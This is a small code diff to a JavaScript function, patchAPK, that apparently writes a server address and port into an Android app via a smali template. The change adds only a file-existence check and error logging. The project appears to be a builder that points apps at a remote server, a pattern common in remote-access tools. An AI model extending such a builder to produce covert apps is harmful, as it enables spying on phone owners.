@@ -63,9 +63,17 @@ function patchAPK(URI, PORT, cb) {
         return cb('Invalid Port');
     }
 
+    // Verify the smali template file exists before attempting to read
+    if (!fs.existsSync(CONST.patchFilePath)) {
+        resetBuildFlag();
+        logManager.log(CONST.logTypes.error, 'File Patch Error - Template file missing: ' + CONST.patchFilePath);
+        return cb('File Patch Error - Template file missing');
+    }
+
     fs.readFile(CONST.patchFilePath, 'utf8', function (err, data) {
         if (err) {
             resetBuildFlag();
+            logManager.log(CONST.logTypes.error, 'File Patch Error - READ: ' + (err.code || err.message) + ' (' + CONST.patchFilePath + ')');
             return cb('File Patch Error - READ');
         }
         
